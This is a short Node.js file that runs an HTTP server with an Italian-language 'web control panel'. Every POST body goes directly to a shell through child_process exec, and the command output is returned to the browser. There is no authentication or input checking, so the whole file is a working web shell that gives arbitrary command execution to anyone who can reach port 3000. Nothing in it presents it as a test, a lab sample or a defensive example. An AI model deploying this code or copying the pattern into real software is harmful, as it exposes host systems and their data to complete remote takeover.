const http = require('http');
const { exec } = require('child_process');
const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            exec(body, (error, stdout, stderr) => {
                res.writeHead(200, {'Content-Type': 'text/plain; charset=utf-8'});
                if (error) {
                    res.end('Errore:\n' + stderr);
                    return;
                }
                res.end(stdout || 'Comando eseguito con successo.');
            });
        });
    } else {
        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
        res.end('<!DOCTYPE html><html><head><title>Pannello Web</title></head><body style="background:#1e1e1e;color:#00ff00;font-family:sans-serif;padding:40px;"><h1>Pannello di Controllo Web Attivo</h1><div style="display:flex;gap:10px;margin-top:20px;"><input type="text" id="cmd" style="flex:1;padding:12px;background:#333;color:#fff;border:1px solid #555;font-size:16px;" placeholder="Digita un comando..."><button onclick="fetch(\'/\', {method:\'POST\', body:document.getElementById(\'cmd\').value}).then(r => r.text()).then(t => document.getElementById(\'out\').value = t)" style="padding:12px 24px;background:#00aa00;color:#fff;border:none;cursor:pointer;font-size:16px;font-weight:bold;">Invia</button></div><div style="margin-top:15px;display:flex;justify-content:space-between;align-items:center;"><span style="color:#aaa;font-size:14px;">Output:</span><button onclick="navigator.clipboard.writeText(document.getElementById(\'out\').value); alert(\'Copiato negli appunti!\');" style="padding:6px 14px;background:#444;color:#fff;border:none;cursor:pointer;font-size:13px;border-radius:4px;">Copia</button></div><textarea id="out" readonly style="width:100%;height:250px;background:#111;color:#00ff00;padding:15px;font-family:monospace;font-size:14px;border:1px solid #333;resize:none;margin-top:5px;" placeholder="L output comparira qui dentro..."></textarea></body></html>');
    }
});
server.listen(3000, () => { console.log('Server in ascolto sulla porta 3000'); });
